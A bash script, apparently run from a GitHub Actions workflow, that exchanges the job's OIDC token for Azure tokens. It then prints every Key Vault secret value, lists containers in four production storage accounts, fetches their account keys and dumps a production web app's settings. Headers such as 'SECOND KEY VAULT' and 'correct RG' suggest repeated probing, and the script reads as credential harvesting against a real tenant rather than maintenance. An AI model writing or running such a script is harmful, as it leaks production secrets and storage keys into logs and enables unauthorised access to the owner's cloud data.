#!/usr/bin/env bash
get_token() {
  local SCOPE="$1"
  local OT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${AZURE_CLIENT_ID}" \
    --data-urlencode "scope=${SCOPE}" \
    --data-urlencode "grant_type=client_credentials" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OT}" | jq -r '.access_token // empty'
}

RG="rg-tbl-platform-prod-sea"

echo "=== SECOND KEY VAULT: kv-tbl-sec-x3euoz ==="
VAULT=$(get_token "https://vault.azure.net/.default")
echo "Vault token: ${#VAULT}"

echo ""
echo "--- Secrets ---"
curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.3" \
  -H "Authorization: Bearer ${VAULT}" | jq . 2>/dev/null

echo ""
echo "--- Reading each secret ---"
SEC_LIST=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.3" \
  -H "Authorization: Bearer ${VAULT}" 2>/dev/null)
for SECRET_ID in $(echo "${SEC_LIST}" | jq -r '.value[]?.id // empty' 2>/dev/null); do
  echo "--- ${SECRET_ID} ---"
  curl -sS "${SECRET_ID}?api-version=7.3" -H "Authorization: Bearer ${VAULT}" | jq . 2>/dev/null
done

echo ""
echo "=== STORAGE ACCOUNTS ==="
STORAGE=$(get_token "https://storage.azure.com/.default")
echo "Storage token: ${#STORAGE}"

for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  echo ""
  echo "=== ${SA}: List containers ==="
  curl -sS "https://${SA}.blob.core.windows.net/?comp=list" \
    -H "Authorization: Bearer ${STORAGE}" \
    -H "x-ms-version: 2020-10-02" 2>&1
done

echo ""
echo "=== MGMT: Storage keys ==="
MGMT=$(get_token "https://management.azure.com/.default")
for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  echo "--- ${SA} ---"
  curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RG}/providers/Microsoft.Storage/storageAccounts/${SA}/listKeys?api-version=2021-09-01" \
    -X POST -H "Authorization: Bearer ${MGMT}" -H "Content-Length: 0" | jq -r '.keys[0].value // .error.message // "err"' 2>/dev/null
done

echo ""
echo "=== MGMT: App Settings (correct RG) ==="
for APP in app-tbl-storefront-prod; do
  echo "--- ${APP} ---"
  curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RG}/providers/Microsoft.Web/sites/${APP}/config/appsettings/list?api-version=2022-03-01" \
    -X POST -H "Authorization: Bearer ${MGMT}" -H "Content-Length: 0" | jq . 2>/dev/null
done

echo ""
echo "=== DONE ==="
